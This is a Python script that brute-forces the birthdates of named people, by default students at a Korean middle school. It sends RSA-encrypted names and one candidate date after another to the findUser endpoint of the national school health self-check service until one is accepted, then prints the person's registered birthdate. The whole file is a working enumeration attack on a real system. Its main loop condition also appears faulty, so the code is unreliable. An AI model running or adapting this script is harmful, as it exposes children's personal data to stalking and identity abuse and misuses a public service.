import requests
import datetime as dt
from base64 import b64decode, b64encode
from Cryptodome.Cipher.PKCS1_v1_5 import new
from Cryptodome.PublicKey.RSA import importKey
from dateutil.relativedelta import relativedelta as red

BASEURL = 'hcs.eduro.go.kr/v2'


def encrypt(s):
    return b64encode(new(importKey(b64decode(
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU'
        '0aqi5u6sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ'
        '8o3FGqMzsMTNxr+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7'
        'yDzcfjfBs99K5xJEppHG0qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzh'
        'wUC8T4G5NclLEWzOQExbQ4oDlZBv8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNN'
        'QQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHjJzGs9MMMWtQIDAQAB=='
    ))).encrypt(message=s.encode('utf-8')[:245])).decode('utf-8')


def OrgCode(sName, level=3, sido='13'):
    params = {
        'lctnScCode': sido,
        'schulCrseScCode': str(level),
        'orgName': sName,
        'loginType': 'school'
    }
    return requests.get(
        url=f'https://{BASEURL}/searchSchool', params=params
    ).json()['schulList'][0]['orgCode']


def findUser(birth, eName, orgCode, sidoURL='cne'):
    jData = {
        "orgCode": orgCode,
        "name": eName,
        "birthday": encrypt(birth),
        "stdntPNo": None,
        "loginType": "school"
    }
    return requests.post(
        url=f'https://{sidoURL}{BASEURL}/findUser', json=jData
    ).json()


def find(name, yy=None, mm=None, dd=None, sName='서일중학교', level=3, ey=False):
    date = dt.date(1960, 1, 1)
    orgCode = OrgCode(sName, level)
    eName = encrypt(name)
    iy, im, i_d = 0, 0, 0

    if yy: iy, date = 1, date.replace(year=int(yy))
    if mm: im, date = 1, date.replace(month=int(mm))
    if dd: i_d, date = 1, date.replace(day=int(dd))

    err = 0
    while not ey and date.year<=int(ey):
        dateStr = dt.date.strftime(date, '%y%m%d')
        print(f'\r{name} 님의 생년월일을 찾는 중... {dateStr}', end='')
        try:
            if not findUser(dateStr, eName, orgCode).get('isError'):
                pm = f'\r{name} 님의 주민등록 상 생년월일(YYMMDD)은 %y%m%d입니다.'
                print(dt.date.strftime(date, pm))
                break
        except KeyboardInterrupt:
            print(f'\nCTRL-C가 눌려 중단합니다.')
            break
        except:
            err += 1
            continue
        if ey and date.year>=int(ey):
            print(f'\n{date.year}>={ey}로 탐색을 중지하였습니다.')
            break
        date += red(years=1) if im and i_d else red(days=1)


def multiFind(nameList, *args, **kwargs):
    for s in nameList:
        find(s, *args, **kwargs)
